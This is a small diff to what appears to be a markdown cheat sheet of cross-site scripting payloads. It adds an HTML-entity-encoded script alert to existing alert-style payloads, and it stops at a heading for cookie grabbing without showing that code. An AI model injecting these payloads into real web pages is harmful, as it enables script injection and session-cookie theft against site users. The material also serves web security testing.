@@ -3,6 +3,7 @@
 <script>alert(1)</script>
 <svg/ onload=alert(123)//
 <script onclick="alert(1)">
+xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt;
 ```
 #### For cookie grabbing.
 ```js
